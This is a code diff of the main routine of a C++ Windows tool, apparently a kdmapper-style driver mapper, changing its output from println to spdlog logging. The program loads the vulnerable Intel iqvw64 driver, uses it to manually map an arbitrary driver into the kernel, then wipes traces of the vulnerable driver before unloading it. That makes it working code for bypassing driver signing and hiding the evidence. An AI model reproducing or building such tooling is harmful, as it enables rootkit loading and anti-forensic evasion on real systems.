@@ -13,29 +13,32 @@
 #include <vuln/vuln_trace_cleaner.hpp>
 
 #include <filesystem>
-#include <print>
+
+#include <spdlog/spdlog.h>
 
 int main(int argc, char** argv)
 {
+    spdlog::set_level(spdlog::level::trace);
+
     if (argc != 2) {
-        std::println("Usage: {} <driver_path>", std::filesystem::path(argv[0]).filename().string());
+        spdlog::error("Usage: {} <driver_path>", std::filesystem::path(argv[0]).filename().string());
         return EXIT_FAILURE;
     }
 
     std::filesystem::path driverPath = argv[1];
     if (!std::filesystem::exists(driverPath)) {
-        std::println("[-] File not found: {}", driverPath.string());
+        spdlog::error("File not found: {}", driverPath.string());
         return EXIT_FAILURE;
     }
 
     const auto driverBytes = Utils::FS::ReadBytesFromFile(driverPath);
     if (driverBytes.empty()) {
-        std::println("[-] Failed to read driver file");
+        spdlog::error("Failed to read driver bytes from file");
         return EXIT_FAILURE;
     }
 
     if (!VulnDriverLoader::EnableLoadPrivileges()) {
-        std::println("[-] Failed to allow load privileges");
+        spdlog::error("Failed to allow load privileges");
         return EXIT_FAILURE;
     }
 
@@ -43,30 +46,30 @@ int main(int argc, char** argv)
 
     VulnDriverLoader driverLoader = VulnDriverLoader(iqvw64);
     if (!driverLoader.Load()) {
-        std::println("[-] Failed to load vulnerable driver");
+        spdlog::error("Failed to load vulnerable driver");
         return EXIT_FAILURE;
     }
 
     auto k32Module = std::make_shared<K32Module>(*iqvw64, "ntoskrnl.exe");
     auto k32ctx = std::make_shared<K32Context>(iqvw64, k32Module);
 
-    DriverMapper driverMapper = DriverMapper(k32ctx, k32Module);
+    DriverMapper driverMapper(k32ctx, k32Module);
     if (!driverMapper.Map((void*)driverBytes.data())) {
-        std::println("[-] Failed to mmap driver");
+        spdlog::error("Failed to manual mapping the driver");
         return EXIT_FAILURE;
     }
 
-    auto vulnTraceCleaner = VulnTraceCleaner(k32ctx, k32Module);
+    VulnTraceCleaner vulnTraceCleaner(k32ctx, k32Module);
     if (!vulnTraceCleaner.Cleanup()) {
-        std::println("[-] Failed to cleanup vulnerable driver traces");
+        spdlog::error("Failed to cleanup vulnerable driver traces");
         return EXIT_FAILURE;
     }
 
     if (!driverLoader.Unload()) {
-        std::println("[-] Failed to unload vulnerable driver");
+        spdlog::error("Failed to unload vulnerable driver");
         return EXIT_FAILURE;
     }
 
-    std::println("[+] Success");
+    spdlog::info("Program has successfully completed its execution");
     return EXIT_SUCCESS;
 }
